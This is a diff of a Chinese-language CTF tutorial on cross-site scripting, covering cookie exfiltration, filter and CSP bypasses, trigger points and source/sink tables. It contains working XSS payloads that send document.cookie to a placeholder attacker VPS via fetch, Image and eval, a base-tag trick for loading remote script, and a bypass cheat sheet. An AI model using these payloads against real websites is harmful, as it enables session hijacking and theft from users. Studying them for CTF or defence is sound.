+当 CSP 限制脚本来源但允许 `<base>` 标签时，可改变相对路径的解析：
 
 ```html
-<img src=x onerror="fetch(&#x27;http://你的VPS/?cookie=&#x27;+document.cookie)">
+<base href="http://攻击者VPS/">
+<script src="/app.js"></script>  <!-- 实际加载 http://攻击者VPS/app.js -->
 ```
 
-浏览器解析属性值时，`&#x27;` 被解码为 `'`，拼出完整的 JS 代码。但字符引用不能用来逃逸 HTML 属性边界：解码后的引号不会重新成为 HTML 语法分隔符，具体效果仍取决于输入原本位于哪种属性和哪一层字符串中。
+若无 CSP 头或策略宽松，直接用标准外带；有严格 CSP 时优先用 `<img>` 外带。
 
-**总结**：
+### 3.7 常见 XSS 触发点汇总
 
-| 编码位置 | 服务端拼接 HTML | innerHTML / document.write | 说明 |
-|---|---|---|---|
-| 编码后的整段标签（如 `&lt;script&gt;`） | 无效 | 无效 | 字符引用解码结果不会被重新解释为标签 |
-| 实际 `<script>` 字符串 | 可执行 | `innerHTML` 插入时不执行 | `document.write()` 等其他 Sink 行为不同 |
-| 实际事件属性元素（如 `<img onerror=...>`） | 可执行 | 可执行 | 还受 CSP、资源加载和事件触发条件影响 |
-| 已有属性值内部的字符引用 | 视上下文而定 | 视上下文而定 | 会解码为属性值字符，但不能重新划分 HTML 属性边界 |
+| 位置 | XSS类型 | 说明 |
+|:----:|:-------:|------|
+| 留言板/评论区 | 存储型 | 最常见，配合Bot |
+| 搜索框/报错提示 | 反射型 | 参数回显到页面 |
+| URL #hash | DOM型 | 前端JS读取hash写入DOM |
+| SVG/HTML上传 | 存储型/反射型 | 文件含JS代码 |
+| window.name | DOM型 | 跨页面保留数据 |
+| postMessage | DOM型 | 跨窗口通信 |
+| URL 参数回显 | 反射型 | 搜索、分页、排序参数 |
+| User-Agent/Referer | 反射型 | 服务端记录并展示请求头 |
+| Cookie | DOM型 | Cookie 值被 JS 读取并写入页面 |
+| 路由参数 (HashRouter) | DOM型 | SPA 路由参数不发送到服务端 |
 
-CTF 中，实体编码更常用于已经进入属性值或 JavaScript 字符串的上下文，不能只凭"DOM 型"或"反射/存储型"判断是否有效。
+---
 
-**6. 反引号（模板字符串）**
+## 四、避坑 — 新手常见误区
 
-当引号（`"` 和 `'`）被过滤时，JavaScript 的模板字符串（反引号 `` ` ``）可以代替引号包裹字符串：
+### 4.1 encodeURIComponent 不能省
 
-```html
-<!-- 正常写法：fetch 的 URL 用单引号包裹 -->
-<svg/onload=fetch('http://你的VPS/?cookie='+document.cookie)>
-<!-- 引号被过滤：改用反引号 -->
-<svg/onload=fetch(`http://你的VPS/?cookie=`+document.cookie)>
+```javascript
+// 危险：Cookie可能含 # & + 等破坏URL结构的字符
+new Image().src='http://VPS/?cookie='+document.cookie
+
+// 安全：URL编码保护结构
+new Image().src='http://VPS/?cookie='+encodeURIComponent(document.cookie)
 ```
 
-模板字符串还支持 `${}` 嵌入表达式，可以省去 `+` 拼接：
+### 4.2 Cookie 不一定有 flag
 
-```html
-<svg/onload=fetch(`http://你的VPS/?cookie=${document.cookie}`)>
+Flag 可能在：`document.cookie`、LocalStorage、页面DOM、接口响应。CTF 中需多种方式尝试。
+
+### 4.3 HttpOnly Cookie 无法读取
+
+`document.cookie` 看不到 `HttpOnly` 标记的 Cookie。此时需：
+- 读取页面DOM中的flag
+- 以受害者身份发请求获取数据
+- 读取 LocalStorage / SessionStorage
+
+### 4.4 Bot 超时收不到请求
+
+外带请求是竞态：Bot 等待时间有限（通常3-5秒）。收不到时检查：
+- VPS 网络是否可达
+- 端口是否放行
+- Bot 是否有足够等待时间
+- 优先用 Image 外带（触发即发，不依赖响应）
+
+### 4.5 innerHTML 不会执行 <script>
+
+通过 `innerHTML` 插入的 `<script>` 标签不会执行！但带事件属性的元素（如 `<img onerror=...>` ）会触发。
+
+### 4.6 实体内编码不能"穿墙"
+
+```
+服务端拼接：&lt;script&gt;alert(1)&lt;/script&gt;
+浏览器看到：显示 "<script>alert(1)</script>" 文本，不会执行
 ```
 
-此外，`eval()` 可以将一段 JS 代码字符串作为参数执行。当需要执行更复杂的代码或绕过某些特征检测时，可以用反引号把整段代码传给 `eval()`：
+实体编码后的字符不会重新进入 HTML 分词器。只在**已有属性值内部**才可能生效。
 
-```html
-<svg/onload=eval(`fetch('http://你的VPS/?cookie='+document.cookie)`)>
-```
+### 4.7 完整新手避坑清单
 
-## 1.11 常见 XSS 触发点总结
+| 编号 | 坑 | 正确做法 |
+|:----:|:---:|---------|
+| 1 | 没用 `encodeURIComponent` 编码 Cookie | Cookie 中 `#` `&` 会破坏 URL |
+| 2 | 只尝试 `document.cookie` | flag 可能在 DOM/LocalStorage/API |
+| 3 | 忽略 HttpOnly Cookie | 无法用 JS 读取，需其他方法 |
+| 4 | Bot 超时收不到请求 | 优先用 Image 外带 |
+| 5 | `innerHTML` 插 `<script>` 不执行 | 用事件属性代替 |
+| 6 | 实体编码穿墙 | 服务端拼接时无效，仅属性值内有效 |
+| 7 | CSP 太严不尝试绕过 | JSONP、`<base>`、同源文件都是突破口 |
+| 8 | 没测试是否真的能弹窗就直接上外带 | 先 `alert(1)` 确认 XSS 存在 |
+| 9 | 只写了一种外带方式 | 多种方式同时尝试提高成功率 |
+| 10 | 忘检查 VPS 防火墙 | 安全组必须放行对应端口 |
 
-CTF 中遇到以下位置时优先测试 XSS：
+---
 
-- 留言板、评论区、个人简介（存储型 XSS）
-- 搜索框、URL 参数回显（反射型 XSS）
-- 页面 JS 读取 `location.hash` 后写入 DOM（DOM 型 XSS）
-- SVG/HTML 文件上传（部分题目允许上传含 JS 的 SVG/HTML 文件）
-- 用户可控的 `window.name`、`postMessage` 接收处理
+## 五、知识总结表
+
+### 数据外带三种方式对比
+
+| 方式 | 写法 | 优点 | 缺点 |
+|:----:|:----:|:----:|:----:|
+| Image | `new Image().src='...'` | 简单、跨域、触发即发 | 无法读响应 |
+| fetch | `fetch('...')` | 异步、不跳转 | Bot关闭时可能取消 |
+| location | `location='...'` | 导航=外带 | 中断后续脚本 |
+| sendBeacon | `navigator.sendBeacon(url, data)` | 页面关闭时仍发送 | POST 方式 |
+
+### Payload 绕过速查
+
+| 难度 | 绕过类型 | 核心技巧 |
+|:----:|:--------:|---------|
+| L1 | 标签过滤 | `svg` `iframe` `details` `marquee` 事件属性 |
+| L2 | 空格过滤 | `/` 代替空格；`new(window.Image)()` |
+| L3 | 大小写 | `<SvG/OnLoAd=...>` |
+| L4 | 双写 | `<scrscriptipt>` |
+| L5 | 引号过滤 | 反引号模板字符串 |
+| L6 | 复杂代码 | `eval(\`...\`)` |
+| L7 | 编码绕过 | 仅属性值内部有效 |
+| L8 | 协议过滤 | `//VPS/` 协议相对 URL |
+| L9 | 括号过滤 | 需特定上下文触发 |
+| L10 | 关键词分割 | `<svg><svg/onload=alert(1)>` |
+
+### Bot 外带可靠性要点
+
+| 因素 | 说明 |
+|:----:|------|
+| 网络通畅 | VPS与题目网络可达 |
+| 端口放行 | 安全组/防火墙放行监听端口 |
+| 等待时间 | Bot默认3-5秒，长内容可能需要更多时间 |
+| 外带方式 | Image > sendBeacon > location > fetch（按可靠性） |
+| 竞态条件 | 页面可能在请求完成前关闭 |
+
+### CSP 绕过方式速查
+
+| CSP 限制 | 绕过方法 | 成功率 |
+|:--------:|---------|:------:|
+| `script-src 'self'` | JSONP 接口注入 | 中 |
+| `script-src 'unsafe-inline'` | 正常注入 | 高 |
+| `script-src 'nonce-xxx'` | 无法猜测 nonce | 低 |
+| `img-src *` | Image 外带 | 高 |
+| `connect-src *` | fetch/XHR 外带 | 高 |
+| `default-src 'none'` | 很难 | 低 |
+| `script-src 'self' 'unsafe-eval'` | eval 执行 | 中 |
+
+### Source vs Sink 速查
+
+| Source | 典型用途 | 是否可控 |
+|:------:|---------|:--------:|
+| `location.hash` | #后片段 |  直接控制 |
+| `location.search` | ?后参数 |  直接控制 |
+| `location.href` | 完整 URL |  间接控制 |
+| `document.referrer` | 来源页面 |  间接控制 |
+| `window.name` | 窗口名 |  跨页面控制 |
+| `postMessage` | 跨窗口消息 |  跨窗口控制 |
+| `document.cookie` | Cookie |  仅读取 |
+
+| Sink | 是否执行 `<script>` | 是否执行事件属性 |
+|:----:|:------------------:|:----------------:|
+| `document.write()` |  |  |
+| `innerHTML` |  |  |
+| `outerHTML` |  |  |
+| `insertAdjacentHTML()` |  |  |
+| `eval()` | （JS 代码） | N/A |
+| `setTimeout()` 字符串 | （JS 代码） | N/A |
+| `Function()` | （JS 代码） | N/A |
